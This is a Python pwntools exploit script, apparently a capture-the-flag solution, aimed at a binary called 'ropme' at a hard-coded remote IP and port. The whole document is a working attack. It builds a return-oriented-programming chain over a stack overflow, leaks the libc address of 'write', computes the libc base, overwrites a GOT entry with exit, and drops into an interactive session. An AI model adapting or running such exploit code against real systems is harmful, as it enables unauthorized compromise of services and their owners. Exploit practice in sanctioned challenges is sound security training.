from pwn import * 
#context.log_level = 'debug' 

e=ELF("./ropme") 
#io=process("./ropme") 
libc=ELF("./libc.so.6") 
io=remote("122.38.251.9", 31337 ) 

debug = False 

if debug : 
    gdb.attach(io, gdbscript='''
    b *0x4011a8
    '''
    ) 
    input('ready') 

# --------------
# gadgets 
pppr    = 0x40117e
write   = e.plt["write"] 
read    = e.plt["read"] 
bss     = e.bss(0x100)
write_got = e.got["write"] 

print(f"bss   = {bss:#x}") 
print(f"write = {write:#x}") 
print(f"read  = {read:#x}") 

# --------------
# payloads 
p = b"p"*0x28 
p += p64(pppr)  
p += p64(0x9)       # rdx  
p += p64(write_got) # rsi  
p += p64(1)         # rdi 
p += p64(0)         # rbp 
p += p64(write)     # leak 'write' function address 
# ---
p += p64(pppr)  
p += p64(0x10)      # rdx  
p += p64(bss)       # rsi  
p += p64(0)         # rdi 
p += p64(0)         # rbp 
p += p64(read)      # read(0, bss, 0x10)  
# ---
p += p64(pppr)  
p += p64(0x10)      # rdx  
p += p64(bss)       # rsi  
p += p64(1)         # rdi 
p += p64(0)         # rbp 
p += p64(write)     # write(1, bss, 0x10) 
# ---
p += p64(pppr)  
p += p64(0x8)       # rdx  
p += p64(write_got) # rsi  
p += p64(0)         # rdi 
p += p64(0)         # rbp 
p += p64(read)      # read(0, write_got, 0x10)  
# ---
p += p64(pppr)  
p += p64(0x10)      # rdx  
p += p64(bss)       # rsi  
p += p64(1)         # rdi 
p += p64(0)         # rbp 
p += p64(write)     # write(1, bss, 0x10) -> exit() 
# --------------

teamname = b'Our_team_name!'
io.send(p)
write_addr = u64(io.read(8))
print(f"write_addr = {write_addr:#x}") 
libc.address = write_addr - libc.symbols['write']  
print(f"libc = {libc.address:#x}") 
exit_ = libc.symbols['exit'] 
#
io.sendline(teamname) 
io.send(p64(exit_))
io.interactive() 


